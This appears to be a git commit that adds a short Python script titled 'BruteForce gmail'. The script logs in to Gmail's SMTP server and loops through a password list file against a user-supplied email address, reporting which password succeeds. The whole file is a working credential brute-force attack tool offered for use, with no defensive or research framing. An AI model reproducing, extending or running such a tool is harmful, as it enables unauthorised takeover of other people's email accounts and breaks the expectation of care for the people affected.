23fe5d96ed6308c883f2a6d2160096a3f51870a4
othr9 <vv9@protonmail.ch>
2017-11-21 09:45:45 -0600

    Add files via upload

---
+++ gmail.py
@@ -0,0 +1,20 @@
+###  BruteForce gmail
+
+
+import smtplib
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+email = input("Enter email:")
+password_ = open('password.txt', "r")
+
+for password in password_:
+        try:
+                smtpserver.login(email, password)
+
+                print("[+] Password Found: {}".format(password))
+                break
+        except smtplib.SMTPAuthenticationError:
+                print("[!] Password Incorrect: {}".format(password))
